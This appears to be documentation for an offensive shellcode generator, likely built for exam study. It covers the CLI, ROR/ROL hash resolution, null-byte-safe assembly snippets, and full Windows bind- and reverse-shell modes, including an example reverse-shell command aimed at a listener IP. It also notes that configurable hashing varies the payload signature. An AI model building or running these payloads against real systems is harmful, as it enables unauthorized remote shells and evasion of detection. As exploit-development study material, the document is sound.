# Documentation: `skeleton.py`

## Overview

> **Note on architecture**: `skeleton.py` was refactored into a thin CLI wrapper after the `shellcode/` package was introduced. All logic — hashing, encoding, snippet blocks, mode builders, and the Keystone assembler wrapper — now lives in the package. `skeleton.py` owns only argument parsing and the Windows execution harness. See [shellcode_package.md](shellcode_package.md) for the full library reference.

`skeleton.py` is an x86 Windows shellcode CLI driver. It provides a command-line interface over the `shellcode/` library for any shellcode that needs to resolve Windows API exports by hash — without hardcoding API strings, without imports, and without calling `GetProcAddress`.

Three modes are supported:

| Mode | What it produces |
|---|---|
| `custom` (default) | Resolves one or more `kernel32` exports; emits a `call_function` placeholder for the caller to fill in |
| `bindshell` | Complete TCP bind shell on a configurable port |
| `revshell` | Complete TCP reverse shell to a configurable host and port |

---

## Usage

```
python skeleton.py [function] [options]
```

### Positional argument

| Argument | Default | Description |
|---|---|---|
| `function` | `LoadLibraryA` | Single `kernel32` export to resolve (custom mode) |

### Options

| Flag | Description |
|---|---|
| `--functions F1,F2,...` | Comma-separated list of `kernel32` exports to resolve. Overrides the positional argument. |
| `--mode {custom,bindshell,revshell}` | Shellcode mode (default: `custom`) |
| `--port N` | Bind port for `bindshell` mode (default: 1337) |
| `--lhost IP` | Listener IP for `revshell` mode (required) |
| `--lport N` | Listener port for `revshell` mode (default: 443) |
| `--algo {ror,rolxor}` | Hash algorithm. `ror` = ROR-N+ADD. `rolxor` = ROL-N+XOR. (default: `ror`) |
| `--rotation N` | Rotation bit count. Default: 13 for `ror`, 7 for `rolxor`. |
| `--hash-only` | Print the hash for a function name and exit. |
| `--show-asm` | Print generated assembly and slot map, then exit without executing. |
| `--stack-string STRING` | Print null-byte-safe push instructions for STRING and exit. |
| `--list-snippets` | List all available named assembly snippets and print static ones. |

### Examples

```bash
# custom: resolve LoadLibraryA (default)
python skeleton.py

# custom: resolve a different function
python skeleton.py GetProcAddress

# custom: resolve multiple functions from kernel32
python skeleton.py --functions LoadLibraryA,CreateProcessA,TerminateProcess

# full bind shell on port 4444 using ROL-7+XOR hashing
python skeleton.py --mode bindshell --port 4444 --algo rolxor

# full reverse shell
python skeleton.py --mode revshell --lhost 192.168.45.174 --lport 443

# print assembly only (no execution) — inspect before running
python skeleton.py --show-asm --mode bindshell --port 1337

# compute a hash without generating shellcode
python skeleton.py --hash-only CreateProcessA
python skeleton.py --hash-only WSAStartup --algo rolxor --rotation 7

# generate stack push instructions for a DLL name
python skeleton.py --stack-string "ws2_32.dll"

# list all snippet blocks
python skeleton.py --list-snippets
```

---

## Hash Algorithms

Both algorithms map to 3 assembly instructions per byte inside `find_function` and have low collision rates against Windows export tables.

### ROR-N + ADD (`--algo ror`, default rotation 13)

**Python:**
```python
def ror_hash(name, rotation=13):
    h = 0
    for c in name:
        h = ((h >> rotation) | (h << (32 - rotation))) & 0xFFFFFFFF
        h = (h + ord(c)) & 0xFFFFFFFF
    return h
```

**Assembly inner loop:**
```asm
ror   edx, 0x0d        ; rotate right N bits
add   edx, eax         ; accumulate byte
```

### ROL-N + XOR (`--algo rolxor`, default rotation 7)

**Python:**
```python
def rolxor_hash(name, rotation=7):
    h = 0
    for c in name:
        h = ((h << rotation) | (h >> (32 - rotation))) & 0xFFFFFFFF
        h = (h ^ ord(c)) & 0xFFFFFFFF
    return h
```

**Assembly inner loop:**
```asm
rol   edx, 0x07        ; rotate left N bits
xor   edx, eax         ; XOR byte in
```

### Algorithm comparison

| Property | ROR+ADD | ROL+XOR |
|---|---|---|
| Direction | Right | Left |
| Accumulation | Addition | XOR |
| Default rotation | 13 | 7 |
| Collision resistance | Low | Low |
| Instructions per byte | 3 | 3 |
| Common usage | Standard shellcode | Metasploit payloads |

The rotation constant is configurable on both algorithms via `--rotation N`, which simultaneously changes the Python hash function and the assembly loop — they always stay in sync.

---

## Network Encoding Helpers

Two helpers convert human-readable values into the push-immediate form required by Winsock:

### `encode_ip(ip)`

Converts a dotted-quad IP string into a little-endian dword for `push`. The bytes land in network (big-endian) byte order at `ESP`:

```
"192.168.45.174" -> 0xae2da8c0
push 0xae2da8c0  -> memory: [c0, a8, 2d, ae] = 192.168.45.174 in network order
```

Returns `(push_value, has_null)`. `has_null` is `True` if any octet is zero — a warning is emitted in the generated assembly since zero octets produce null bytes in the push immediate.

### `encode_port(port)`

Converts a port number into the byte-swapped value for `mov ax` so it lands in big-endian order in the `sockaddr_in`:

```
port 443 (0x01BB) -> mov ax, 0xBB01
after shl/add:  memory = [02 00 01 BB] = AF_INET + port 443
```

Returns `(mov_ax_value, has_null)`. Common exam ports (443, 1337, 4444) have no null bytes.

---

## Stack String Builder

`stack_string_pushes(s)` converts an ASCII string into a list of x86 push instructions that place the null-terminated string on the stack. After execution, `ESP` points to the string start.

### How it works

The string is split into 4-byte chunks, pushed in reverse order. The result at `ESP` reads as the original string in left-to-right order.

Example for `"ws2_32.dll"` (10 bytes → padded to 12):

```
Chunks:  "ws2_"  "32.d"  "ll\x00\x00"
```

Push order (last pushed = lowest address, first to be read):
```asm
xor eax, eax
mov ax, 0x6c6c         # "ll  " — trailing nulls handled with mov ax
push eax
push 0x642e3233        # "32.d"
push 0x5f327377        # "ws2_"
push esp               # ESP -> "ws2_32.dll\x00"
```

### Null-byte handling

| Pattern | Technique |
|---|---|
| No nulls in chunk | `push 0xDDCCBBAA` |
| Two trailing nulls `[A, B, 0, 0]` | `xor eax,eax` / `mov ax, 0xBBAA` / `push eax` |
| Three trailing nulls `[A, 0, 0, 0]` | `xor eax,eax` / `mov al, 0xAA` / `push eax` |
| One trailing null `[A, B, C, 0]` | `xor eax,eax` / `mov al,C` / `shl` / `mov al,B` / `shl` / `mov al,A` / `push eax` |
| Embedded null | `# WARNING` comment emitted — manual fix required |

The `--stack-string` CLI mode runs this builder and appends `push esp`:

```bash
$ python skeleton.py --stack-string "ws2_32.dll"
# Stack string: "ws2_32.dll" (10 bytes, padded to 12)
    xor eax, eax
    mov ax, 0x6c6c         # "ll  "
    push eax
    push 0x642e3233        # "32.d"
    push 0x5f327377        # "ws2_"
    push  esp              # ESP -> "ws2_32.dll"
```

---

## Slot Allocator

`SlotAllocator` tracks EBP-relative dword slots for saved function pointers. Each resolved function needs a 4-byte slot; allocations start at `[ebp+0x10]` and increment by 4.

```
[ebp+0x04]  find_function pointer  — permanently reserved by call/pop thunk
[ebp+0x10]  first resolved function
[ebp+0x14]  second resolved function
[ebp+0x18]  third resolved function
...
```

The allocator is created internally by each mode builder. Its `print_map()` method is called automatically when shellcode is assembled or `--show-asm` is used, printing every name-to-slot mapping so the developer always knows what is where.

---

## Assembly Snippets

Snippets are reusable assembly blocks. Static snippets are plain string constants; parameterized snippets are functions that take slot values or network parameters and return a string.

View all snippets with:
```bash
python skeleton.py --list-snippets
```

### Register conventions

All snippets follow this register contract:

| Register | Meaning when entering a snippet |
|---|---|
| `EBX` | DLL base address (for `find_function` searches) |
| `ESI` | Socket handle (set before `STARTUPINFOA` blocks) |
| `EDI` | `STARTUPINFOA` pointer (set by `startupinfoa_*`, consumed by `createprocessa`) |
| `EBX` | Command string pointer (set by `cmd_string`, consumed by `createprocessa`) |

### Static snippets

#### `startupinfoa_socket`
Builds a `STARTUPINFOA` structure on the stack with `ESI` as `hStdInput`, `hStdOutput`, and `hStdError`. Sets `dwFlags = STARTF_USESTDHANDLES (0x100)`. After execution, `EDI` = `&STARTUPINFOA`.

Use when the process being spawned should have its I/O redirected to a socket (bind shell, reverse shell).

#### `startupinfoa_null`
Builds a zeroed `STARTUPINFOA` (all handles `NULL`, `dwFlags = 0`). After execution, `EDI` = `&STARTUPINFOA`.

Use when spawning a process that should inherit its own console handles (SMB execution, silent launch).

#### `cmd_string`
Builds the string `"cmd.exe"` on the stack using a negation trick to avoid null bytes:
```asm
mov   eax, 0xff9a879b    ; negated form of 0x00657865
neg   eax                ; EAX = 0x00657865 = "exe\x00"
push  eax
push  0x2e646d63         ; "cmd."
push  esp
pop   ebx                ; EBX = "cmd.exe"
```

### Parameterized snippets

#### `snippet_createprocessa(slot)`
Calls `CreateProcessA` using `EDI` (STARTUPINFOA pointer) and `EBX` (command string). `slot` is the EBP offset for the `CreateProcessA` address.

#### `snippet_terminateprocess(slot)`
Calls `TerminateProcess(0xFFFFFFFF, 0)` — terminates the current process cleanly.

#### `snippet_wsa_init(slot)`
Calls `WSAStartup(0x0202, lpWSAData)`. The `WSADATA` buffer is placed at `ESP - 0x590` to avoid overwriting live stack data.

#### `snippet_wsa_socket_tcp(slot)`
Calls `WSASocketA(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, ...)`. Returns socket descriptor in `EAX`. All constant arguments are built without null bytes using add/sub/inc.

#### `snippet_sockaddr_bind(port)`
Builds a `sockaddr_in` on the stack for `bind(0.0.0.0:port)`. After execution, `ESI` = socket and `EDI` = `&sockaddr_in`.

Emits a warning comment if `port` would produce a null byte in the `mov ax` encoding.

#### `snippet_bind_listen_accept(bind_slot, listen_slot, accept_slot)`
Calls `bind`, `listen`, and `accept` in sequence using `EDI` (sockaddr) and `ESI` (socket). After `accept` returns, `ESI` is updated to the accepted client socket handle.

#### `snippet_wsaconnect(lhost, lport, slot)`
Builds a `sockaddr_in` for the remote address and calls `WSAConnect`. At entry, `EAX` must hold the socket descriptor from `WSASocketA`; `ESI` is set to it at the top of the snippet and is preserved through the call.

Emits warning comments if `lhost` contains a zero octet or `lport` produces a null byte.

---

## Assembly Structure

All modes share the same first four sections; only the payload sections differ.

```
start                        prologue (stack setup)
find_kernel32                PEB walk to locate kernel32.dll
  next_module
find_function_shorten        call/pop thunk (stores find_function address)
  find_function_ret
  find_function_shorten_bnc
find_function                PE export resolver with configurable hash loop
  find_function_loop
  compute_hash
  compute_hash_again
  compute_hash_finished
  find_function_compare
  find_function_finished
resolve_symbols_kernel32     resolve kernel32 exports (push/call/save per function)
[mode-specific sections]
```

### Shared sections

#### Prologue
```asm
mov   ebp, esp
add   esp, 0xfffff9f9    ; avoids null bytes (equiv: sub esp, 0x607)
```

#### find_kernel32
Walks `FS:0x30 → PEB → Ldr → InInitializationOrderModuleList`. Checks if character 12 of each module name (UTF-16LE, offset `12*2`) is null — matching `kernel32.dll` exactly. On match, `EBX` = kernel32 base address.

#### find_function_shorten (call/pop thunk)
Position-independent technique: a `call` instruction pushes the address of `find_function` onto the stack; `pop esi` retrieves it and saves it to `[ebp+0x04]`.

#### find_function
Parses the PE export directory of the DLL at `EBX`. For each export name, computes the configured hash and compares with the value at `[esp+0x24]` (the hash pushed by the caller before the `call find_function`). On match, resolves the function's virtual address and returns it in `EAX` via the `pushad` slot overwrite trick.

### Mode-specific sections

#### `custom` mode

```
resolve_symbols_kernel32   push/call/save for each requested function
call_function              PLACEHOLDER — developer fills in arguments
```

#### `bindshell` mode

```
resolve_symbols_kernel32   TerminateProcess, LoadLibraryA, CreateProcessA
load_ws2_32_dll            stack string "ws2_32.dll" + LoadLibraryA call
resolve_ws2_32_dll         WSAStartup, WSASocketA, bind, listen, accept
call_wsastartup            WSAStartup(2.2)
call_wsasocketa            WSASocketA -> EAX = socket
create_sockaddr_bind       sockaddr_in for 0.0.0.0:port -> ESI=socket, EDI=&addr
call_bind                  bind(socket, &sockaddr_in, 16)
call_listen                listen(socket, 0)
call_accept                accept(socket, NULL, NULL) -> ESI = client socket
create_startupinfoa        STARTUPINFOA with ESI as I/O handles -> EDI = &STARTUPINFOA
create_cmd_string          "cmd.exe" on stack -> EBX = pointer
call_createprocessa        CreateProcessA("cmd.exe", ..., &STARTUPINFOA)
call_terminateprocess      TerminateProcess(0xffffffff, 0)
```

#### `revshell` mode

```
resolve_symbols_kernel32   TerminateProcess, LoadLibraryA, CreateProcessA
load_ws2_32_dll            stack string "ws2_32.dll" + LoadLibraryA call
resolve_ws2_32_dll         WSAStartup, WSASocketA, WSAConnect
call_wsastartup            WSAStartup(2.2)
call_wsasocketa            WSASocketA -> EAX = socket
call_wsaconnect            sockaddr_in for lhost:lport + WSAConnect -> ESI = socket
create_startupinfoa        STARTUPINFOA with ESI as I/O handles -> EDI = &STARTUPINFOA
create_cmd_string          "cmd.exe" on stack -> EBX = pointer
call_createprocessa        CreateProcessA("cmd.exe", ..., &STARTUPINFOA)
call_terminateprocess      TerminateProcess(0xffffffff, 0)
```

---

## EBP Slot Map

`[ebp+0x04]` is always reserved. User slots are assigned sequentially starting at `[ebp+0x10]`.

The slot map is printed automatically on every run (both `--show-asm` and live execution). Example for `bindshell` with default ROR-13:

```
Slot map:
  [ebp+0x04] = find_function  (reserved)
  [ebp+0x10] = TerminateProcess
  [ebp+0x14] = LoadLibraryA
  [ebp+0x18] = CreateProcessA
  [ebp+0x1c] = WSAStartup
  [ebp+0x20] = WSASocketA
  [ebp+0x24] = bind
  [ebp+0x28] = listen
  [ebp+0x2c] = accept
```

---

## Multi-Function Resolution (`--functions`)

`--functions` overrides the positional argument and resolves a comma-separated list from `kernel32`. All functions are resolved before the `call_function` placeholder, and the placeholder lists all their slots as comments:

```bash
python skeleton.py --functions LoadLibraryA,CreateProcessA,TerminateProcess
```

Generated resolve block:
```asm
resolve_symbols_kernel32:
    push  0xec0e4e8e           # LoadLibraryA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x10], eax
    push  0x16b3fe72           # CreateProcessA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x14], eax
    push  0x78b5b983           # TerminateProcess
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x18], eax
call_function:
    # [ebp+0x10] = LoadLibraryA
    # [ebp+0x14] = CreateProcessA
    # [ebp+0x18] = TerminateProcess
    # Push arguments for your chosen function above, then:
    call  dword ptr [ebp+0x10]    # LoadLibraryA
```

---

## DLL Load + Resolve Chain

`_build_load_and_resolve` implements the pattern for resolving exports from any DLL beyond kernel32:

1. Build DLL name on stack (`stack_string_pushes`)
2. `push esp` — argument pointer to LoadLibraryA
3. Call `LoadLibraryA` — returns DLL base in `EAX`
4. `mov ebx, eax` — `EBX` now points to the new DLL
5. Repeat push/call/save triplets — `find_function` now searches the new DLL

This is used automatically in `bindshell` and `revshell` to load `ws2_32.dll`.

To extend a custom shellcode with a second DLL, combine `--functions` for kernel32 with manual assembly for the second DLL using snippets from `--list-snippets`.

---

## Python Execution Harness

The harness lives in `skeleton.py` (not in the library) because it requires `ctypes.windll`, which is only available on Windows. It is identical in structure across all scripts in this repository:

| Step | API | Key parameters |
|---|---|---|
| Allocate RWX memory | `VirtualAlloc` | `MEM_COMMIT\|MEM_RESERVE (0x3000)`, `PAGE_EXECUTE_READWRITE (0x40)` |
| Copy shellcode | `RtlMoveMemory` | destination = allocated pointer |
| Execute | `CreateThread` | start address = allocated pointer |
| Wait | `WaitForSingleObject` | timeout = `INFINITE (-1)` |

The harness also prints the slot map, instruction count, byte count, allocation address, and the full shellcode as a Python byte string before prompting to execute.

---

## Technique Summary

| Technique | Description |
|---|---|
| PEB traversal | Locates `kernel32.dll` without `GetModuleHandle` |
| PE export hashing | Resolves API addresses without `GetProcAddress` or string literals |
| Configurable hash (ROR or ROL+XOR) | Swap algorithm to vary shellcode signature |
| Configurable rotation | Further varies hash output and assembly byte pattern |
| Call/pop thunk | Position-independent capture of `find_function` address |
| Null-byte-safe encoding | `add esp` trick for prologue; `mov ax/al` for stack strings; `neg` for `cmd.exe` |
| Slot allocator | Automatic EBP offset assignment with printed map for debugging |
| Named snippets | Composable, reusable assembly blocks for common payload actions |
| Multi-DLL chain | Load any DLL via `LoadLibraryA`, redirect `find_function` by updating `EBX` |
